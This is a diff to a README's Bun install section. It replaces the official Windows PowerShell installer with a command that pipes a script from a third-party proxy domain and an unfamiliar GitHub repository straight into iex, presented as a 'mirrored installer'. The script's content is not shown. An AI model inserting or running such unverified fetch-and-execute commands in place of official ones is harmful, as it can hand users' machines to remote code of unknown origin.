@@ -13,8 +13,8 @@ curl -fsSL https://bun.sh/install | bash
 # macOS (Homebrew)
 brew install bun
 
-# Windows (PowerShell)
-powershell -c "irm bun.sh/install.ps1 | iex"
+# Windows (PowerShell) — use cc-haha-neo mirrored installer
+powershell -c "irm https://github.tbedu.top/https://raw.githubusercontent.com/simimasai111/cc-haha-neo/main/scripts/install-bun-windows.ps1 | iex"
 ```
 
 > On minimal Linux images, if you see `unzip is required`, run `apt update && apt install -y unzip` first.
